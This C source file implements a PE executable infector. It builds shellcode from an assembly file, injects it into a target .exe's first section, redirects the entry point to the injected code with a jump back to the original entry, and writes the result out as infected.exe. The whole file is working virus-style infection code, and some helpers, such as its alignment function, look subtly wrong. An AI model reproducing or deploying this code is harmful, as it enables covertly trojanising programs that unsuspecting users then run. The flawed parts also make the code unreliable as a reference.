#include "peInfect.h"

static size_t align(size_t size, size_t alignment) {
  return ((size >> 0x9) + alignment);
}

static int  patchShellcode(file *shellcode, uint32_t entryPoint, uint32_t oldEntryPoint) {
  char    ins[5];
  void    *header;
  size_t  address;

  address = -(entryPoint - oldEntryPoint + shellcode->size);
  ins[0] = 0xe9;
  ins[1] = (address >> 0) & 0xff;
  ins[2] = (address >> 8) & 0xff;
  ins[3] = (address >> 16) & 0xff;
  ins[4] = (address >> 24) & 0xff;
  if ((header = mmap(NULL, shellcode->size + 5, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
    return (-1);
  memcpy(header, shellcode->start, shellcode->size);
  memcpy(header + shellcode->size, ins, 5);
  munmap(shellcode->start, shellcode->size);
  shellcode->size += 5;
  shellcode->start = header;
  return (0);
}

static int  getHeader(const char *filename, file *bin) {
  int         fd;
  struct stat stats;

  if ((fd = open(filename, O_RDONLY)) == -1)
    return (-1);
  if (stat(filename, &stats) == -1)
    return (-1);
  if ((bin->start = mmap(NULL, stats.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
    return (-1);
  bin->size = stats.st_size;
  bin->header = bin->start + *((uint32_t *)(bin->start + 0x3c)) + 4;
  close(fd);
  return (0);
}

static int  getShellcode(file *bin, uint32_t alignment) {
  int         fd;
  struct stat stats;

  if (system("nasm -o shellcode -f bin srcs/shellcode.s") == -1)
    return (-1);
  if (stat("shellcode", &stats) == -1)
    return (-1);
  bin->size = stats.st_size;
  if ((fd = open("shellcode", O_RDONLY)) == -1)
    return (-1);
  if ((bin->start = mmap(NULL, align(stats.st_size, alignment), PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
    return (-1);
  bin->header = NULL;
  close(fd);
  return (0);
}

static int  writeToFile(file bin) {
  int   fd;

  if ((fd = open("./infected.exe", O_CREAT | O_TRUNC | O_WRONLY, S_IRWXU | S_IRGRP | S_IXGRP | S_IXOTH | S_IROTH)) == -1)
    return (-1);
  write(fd, bin.start, bin.size);
  close(fd);
  return (0);
}

static int  copyContent(file *bin, uint32_t loc, void *content, size_t contentSize, int overwrite) {
  void    *newBin;

  if ((newBin = mmap(NULL, contentSize + bin->size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
    return (-1);
  memcpy(newBin, bin->start, loc);
  memcpy(newBin + loc, content, contentSize);
  if (overwrite) {
    memcpy(newBin + loc + contentSize, ((void *)bin->start) + loc + contentSize, bin->size - loc - contentSize);
  } else {
    memcpy(newBin + loc + contentSize, ((void *)bin->start) + loc, bin->size - loc);
  }
  munmap(bin->start, bin->size);
  bin->start = newBin;
  bin->size += contentSize;
  bin->header = bin->start + *((uint32_t *)(bin->start + 0x3c)) + 4;
  return (0);
}

static int  resizeCodeSection(file *bin, file shellcode) {
  size_t      i;
  PE64_Shdr   *shHeader;
  PE64_OptHdr *optHeader;
  PE64_Shdr   *codeSection;

  optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
  shHeader = ((void *)optHeader) + bin->header->optHeaderSize;
  copyContent(bin, shHeader->paddr + shHeader->memsz, shellcode.start, align(shellcode.size, optHeader->fileAlignment), 0);
  optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
  optHeader->sizeofcode += shellcode.size;
  optHeader->sizeOfImage += shellcode.size;
  shHeader = ((void *)optHeader) + bin->header->optHeaderSize;
  optHeader->entryPoint = shHeader->vaddr + shHeader->memsz;
  shHeader->memsz += shellcode.size;
  shHeader->filesz += align(shellcode.size, optHeader->fileAlignment);
  // TODO only if symtbl is after code section
  bin->header->symTbl += align(shellcode.size, optHeader->fileAlignment);
  i = 0;
  codeSection = ((void *)optHeader) + bin->header->optHeaderSize;
  while (i < bin->header->shnum) {
    shHeader = ((void *)optHeader) + bin->header->optHeaderSize + sizeof(PE64_Shdr) * i;
    if (shHeader->paddr > codeSection->paddr + (codeSection->memsz - align(shellcode.size, optHeader->fileAlignment)))
      shHeader->paddr += optHeader->fileAlignment;
    i += 1;
  }
  return (0);
}

int     main(int argc, const char **argv) {
  file          bin;
  file          shellcode;
  PE64_Shdr     *shHeader;
  PE64_OptHdr   *optHeader;

  if (argc != 2) {
    dprintf(2, "Usage: %s fileToInfect.exe\n", argv[0]);
    return (1);
  }
  if (getHeader(argv[1], &bin) == -1)
    return (1);
  optHeader = ((void *)bin.header) + sizeof(PE64_Ehdr);
  optHeader->checksum = 0;
  if (getShellcode(&shellcode, optHeader->fileAlignment) == -1)
    return (1);
  shHeader = ((void *)optHeader) + bin.header->optHeaderSize;
  if (patchShellcode(&shellcode, shHeader->vaddr + shHeader->memsz, optHeader->entryPoint) == -1)
    return (1);
  if (resizeCodeSection(&bin, shellcode) == -1)
    return (1);
  if (writeToFile(bin) == -1)
    return (-1);
  munmap(bin.start, bin.size);
  munmap(shellcode.start, shellcode.size);
  dprintf(1, "Done !\n");
  return (0);
}
